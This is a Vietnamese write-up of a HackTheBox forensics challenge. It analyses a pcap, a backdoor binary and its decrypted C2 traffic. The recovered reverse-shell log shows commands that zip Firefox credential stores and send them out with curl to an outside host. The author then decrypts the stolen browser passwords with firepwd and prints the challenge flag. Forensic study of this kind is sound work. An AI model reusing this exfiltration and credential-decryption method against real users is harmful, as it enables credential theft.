# Mask Off-hackthebox

![image.png](Diagnostic-hackthebox-easy/An%20unusual%20sighting-ctftryout-hackthebox/image.png)

- Sau khi unzip ra thì chúng ta sẽ nhận được 1 file pcap bây giờ mình sẽ dùng networkminner để check nhé.

 

![image.png](Diagnostic-hackthebox-easy/An%20unusual%20sighting-ctftryout-hackthebox/image%201.png)

- Thấy có 1 file elf và zip, khi mở file elf bằng ida thì phát hiện ra một chuỗi: S3cr3tP@ss có vẻ là mk gì đó sau đó mình còn phát hiện: Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]  có vẻ là c2 trafic nên mình sẽ dùng tool để xử lý đó:

[https://github.com/AnvithLobo/rekobee-analyzer](https://github.com/AnvithLobo/rekobee-analyzer)

- Link git của tool đấy nhé.

➜  dh python3 /home/vanduc123/ctf/dh/rekobee-analyzer-main/analyze.py -c capture.pcap -s 'S3cr3tP@ss'
[ ok ] Found the initial packet at 6.
[ ok ] The server is authenticated by the client.
[ ok ] The client is authenticated by the server.
[info] Handling 'reverse shell' command.
[error] Error while reading data from the socket.
[error] Error while reading data from the socket.
← whoami
← grps
← ls ~/.mozilla/firefox
← cd ~.//.mozilla/firefox/6z9z8d96.default-release
← zip -9 -PnL98udHrzk5vhrLWns3hIDi b12gb.zip cert9.db key4.db times.json logins.json
← curl -F 'data=@/home/cpie/.mozilla/firefox/6z9z8d96.default-release/b12gb.zip' [http://192.168.1.11:8000](http://192.168.1.11:8000/)
← rm b12gb.zip
← exit
←
→ cpie@ubuntu1804:~/Documents$ whoami
→ cpie
→ cpie@ubuntu1804:~/Documents$ groups
→ cpie sudo
→ cpie@ubuntu1804:~/Documents$ ls ~/.mozilla/firefox
→  3nzysz44.default   6z9z8d96.default-release  'Crash Reports'   installs.ini  'Pending Pings'   profiles.ini
→ cpie@ubuntu1804:~/Documents$ cd ~/.mozilla/firefox/6z9z8d96.default-release
→ cpie@ubuntu1804:~/.mozilla/firefox/6z9z8d96.default-release$ zip -9 -PnL98udHrzk5vhrLWns3hIDi b12gb.zip cert9.db key4.db times.json logins.json
→   adding: cert9.db (deflated 96%)
→   adding: key4.db (deflated 99%)
→   adding: times.json (deflated 16%)
→   adding: logins.json (deflated 57%)
→ cpie@ubuntu1804:~/.mozilla/firefox/6z9z8d96.default-release$ curl -F 'data=@/home/cpie/.mozilla/firefox/6z9z8d96.default-release/b12gb.zip' [http://192.168.1.11:8000](http://192.168.1.11:8000/)
→ curl: (52) Empty reply from server
→ cpie@ubuntu1804:~/.mozilla/firefox/6z9z8d96.default-release$ rm b12gb.zip
→ cpie@ubuntu1804:~/.mozilla/firefox/6z9z8d96.default-release$ exit
→ logout
→
[info] Done.
➜  dh

- Đây là đoạn được in ra sau khi chạy mọi người có thể thấy đây có pass cho file zip mà chúng ta lấy được ở file pcap: nL98udHrzk5vhrLWns3hIDi, tiến hành giải nén file zip bằng mật khẩu chúng ta sẽ nhận được hồ sơ lữu trữ mật khẩu của trình duyệt firefox, các bạn hãy dùng tool **firepwd để giải mã nó nhé**

➜  firepwd git:(master) python3 [firepwd.py](http://firepwd.py/) -d /home/vanduc123/ctf/dh
globalSalt: b'96aeaca0358b23e0cc8e40971afbf02c2963decb'
SEQUENCE {
SEQUENCE {
OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
SEQUENCE {
SEQUENCE {
OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
SEQUENCE {
OCTETSTRING b'a02d0fc94400c9c9ca058213ffb07c65b65e6a8bf39f4147e0a763c5bb3477ca'
INTEGER b'01'
INTEGER b'20'
SEQUENCE {
OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
}
}
}
SEQUENCE {
OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
OCTETSTRING b'2441830a006b2fc8e1718b8f2b00'
}
}
}
OCTETSTRING b'cd718b2a2e2baba0deeb7dc511e38fcd'
}
clearText b'70617373776f72642d636865636b0202'
password check? True
SEQUENCE {
SEQUENCE {
OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
SEQUENCE {
SEQUENCE {
OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
SEQUENCE {
OCTETSTRING b'a9cc7c3210036483d63be23286b2dbe8a860791cf4f0251ba3a2afe69ec68de9'
INTEGER b'01'
INTEGER b'20'
SEQUENCE {
OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
}
}
}
SEQUENCE {
OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
OCTETSTRING b'2224e7f0efdcdcd4bc914fce15d3'
}
}
}
OCTETSTRING b'6f1f59c322ad055f25ce16a11a92b23d49a100c638d7b8d1938694c78bdac293'
}
clearText b'2307b06d738aaee60b8510044343316802f7c2da4910cd4a0808080808080808'
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
[https://www.facebook.com:b'cpie@gmail.com](https://www.facebook.com:b%27cpie@gmail.com/)',b'password1'
[https://account.protonmail.com:b'cpie@protonmail.com](https://account.protonmail.com:b%27cpie@protonmail.com/)',b'5SGcwI95HW9mcQ7U'
[https://login.cncserver.com:7443](https://login.cncserver.com:7443/):b'admin',b'HTB{r0ses_4r3_r3d_v10l3ts_4r3_blu3_n0w_I_must_d3l3t3_th1s_b4ckd00r_4nd_r3s3t_my_p4ssw0rds_t00}'
➜  firepwd git:(master)

HTB{r0ses_4r3_r3d_v10l3ts_4r3_blu3_n0w_I_must_d3l3t3_th1s_b4ckd00r_4nd_r3s3t_my_p4ssw0rds_t00
